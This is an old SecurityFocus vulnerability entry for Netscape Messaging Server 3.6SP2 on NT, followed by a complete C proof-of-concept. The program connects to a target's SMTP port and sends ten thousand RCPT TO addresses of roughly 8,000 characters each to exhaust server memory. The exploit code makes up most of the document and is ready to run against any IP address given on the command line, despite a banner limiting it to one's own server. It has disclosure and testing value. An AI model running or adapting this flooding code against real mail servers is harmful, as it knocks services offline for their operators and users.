source: http://www.securityfocus.com/bid/748/info

Netscape Messaging server will not de-allocate memory that is used to store the RCPT TO information for an incoming email. By sending enough long RCPT TO addresses, the system can be forced to consume all available memory, leading to a denial of service. 

/***************************************************************
 You can test "YOUR" Netscape Messaging Server 3.6SP2 for NT
 whether vulnerable for too much RCPT TO or not. 
                  by Nobuo Miwa, LAC Japan  28th Oct. 1999 
                  http://www.lac.co.jp/security/ 
****************************************************************/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define    STR_HELO      "HELO rcpt2\n"
#define    STR_MAILFROM  "MAIL FROM:rcpt2\n"
#define    RCPT2_LENGTH  8000
#define    RCPT2_NUMBER  10000

int openSocket(struct sockaddr_in *si, char *hostIPaddr)
{
    int             port=25, sd, rt ;
    long            li ;
    struct hostent  *he;

    si->sin_addr.s_addr = inet_addr(hostIPaddr);
    si->sin_family      = AF_INET;
    si->sin_port        = htons (port);
    sd = socket (si->sin_family, SOCK_STREAM, 0);
    if (sd == -1) return (-1);

    rt = connect(sd,(struct sockaddr *)si,sizeof(struct sockaddr_in));
    if ( rt < 0 ) {
       close(sd);
       return(-1);
    }

    return(sd) ;
}

void sendRCPT2(int sd)
{
    char    rcptStr[RCPT2_LENGTH], tmpStr[RCPT2_LENGTH+80], strn[80];
    int     rt, i;

    memset( tmpStr, 0, sizeof(tmpStr) ) ;
    recv( sd, tmpStr, sizeof(tmpStr), 0 );
    printf("%s",tmpStr);  

    printf("%s",STR_HELO);
    send( sd, STR_HELO, strlen(STR_HELO), 0 );
    memset( tmpStr, 0, sizeof(tmpStr) ) ;
    rt = recv( sd, tmpStr, sizeof(tmpStr), 0 );
    if ( rt>0 ) printf("%s",tmpStr);

    printf("%s",STR_MAILFROM);
    send(sd, STR_MAILFROM, strlen(STR_MAILFROM), 0);
    memset( tmpStr, 0, sizeof(tmpStr) ) ;
    rt = recv(sd, tmpStr, sizeof(tmpStr), 0);
    if ( rt>0 ) printf("%s",tmpStr);

    strcpy( rcptStr, "RCPT TO: rcpt2@" ) ;
    while ( RCPT2_LENGTH-strlen(rcptStr)>10 )
        strcat( rcptStr, "aaaaaaaaaa") ;
    strcat( rcptStr, "\n" );
    for ( i=0 ; i<RCPT2_NUMBER ; i++ ) {
        printf("No.%d RCPT TO:rcpt2@aaa.. len %d\n",i,strlen(rcptStr));
        send( sd, rcptStr, strlen(rcptStr), 0 );
        rt = recv( sd, tmpStr, sizeof(tmpStr)-1, 0 );
        strncpy( strn, tmpStr, 60 ) ;
        if ( rt>0 ) printf("%s \n",strn);
    }

    return;
}

int main (int argc, char *argv[])
{
    char                 hostIPaddr[80], *cc, *pfft;
    int                  sd = 0;
    struct sockaddr_in   si;

    printf("You can use ONLY for YOUR Messaging Server 3.6\n");
    if (argc != 2) {
        printf("Usage: %s IPaddress \n",argv[0]);
        exit(1);
    } else
        strcpy (hostIPaddr, argv[1]);

    sd = openSocket(&si,hostIPaddr);  

    if (sd < 1) {
        printf("failed!\n");
        exit(-1);
    }

    sendRCPT2( sd );
    close (sd);

    exit(0);
}